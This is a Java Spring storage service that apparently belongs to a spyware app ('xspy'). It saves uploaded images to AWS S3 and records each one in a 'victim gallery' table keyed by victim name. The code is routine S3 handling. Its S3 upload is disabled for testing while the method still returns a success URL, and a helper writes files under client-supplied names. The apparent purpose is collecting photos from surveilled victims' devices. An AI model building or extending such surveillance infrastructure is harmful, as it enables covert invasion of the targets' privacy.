package com.leadexperience.xspy.s3;

import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.model.CannedAccessControlList;
import com.amazonaws.services.s3.model.PutObjectRequest;
import com.amazonaws.services.s3.model.S3Object;
import com.amazonaws.services.s3.model.S3ObjectInputStream;
import com.amazonaws.util.IOUtils;
import com.leadexperience.xspy.models.StatusCodeModel;
import com.leadexperience.xspy.models.tables.GalleryTable;
import com.leadexperience.xspy.respository.VictimGalleryRepo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

@Service
public class StorageService {
    @Value("${application.bucket.name}")
    private String bucketName;

    @Autowired
    private AmazonS3 s3Client;

    @Autowired
    private VictimGalleryRepo victimGalleryRepo;

    public ResponseEntity<?> uploadFile(MultipartFile file, String victimName) {
//        File fileObj = convertMultiPartFileToFile(file);
        String fileName = System.currentTimeMillis() + "_" + file.getOriginalFilename();

        // WE NEED TO WRITE THE ACL COMMANDS.

        // TODO : FOR TESTING WE ARE DISABLING THE UPLOAD JUST THE LOCAL UPLOAD.



//        s3Client.putObject(new PutObjectRequest(bucketName, fileName, fileObj).withCannedAcl(CannedAccessControlList.PublicRead));

        // GETTING THE S3 BUCKET - OBJECT WE JUST UPLOADED

        GalleryTable galleryTable = new GalleryTable();
        galleryTable.setImageUrl(AwsConstants.BUCKET_BASE_URL+fileName);
        galleryTable.setVictimName(victimName);
        victimGalleryRepo.save(galleryTable);
        victimGalleryRepo.flush();


//        fileObj.delete();

        return ResponseEntity.ok(new StatusCodeModel("success",200,AwsConstants.BUCKET_BASE_URL+fileName));

    }


    public byte[] downloadFile(String fileName) {
        S3Object s3Object = s3Client.getObject(bucketName, fileName);
        S3ObjectInputStream inputStream = s3Object.getObjectContent();
        try {
            byte[] content = IOUtils.toByteArray(inputStream);
            return content;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


    public String deleteFile(String fileName) {
        s3Client.deleteObject(bucketName, fileName);
        return fileName + " removed ...";
    }


    private File convertMultiPartFileToFile(MultipartFile file) {
        File convertedFile = new File(file.getOriginalFilename());
        try (FileOutputStream fos = new FileOutputStream(convertedFile)) {
            fos.write(file.getBytes());
        } catch (IOException e) {
            System.out.print("IO EXCEPTION..");
        }
        return convertedFile;
    }
}
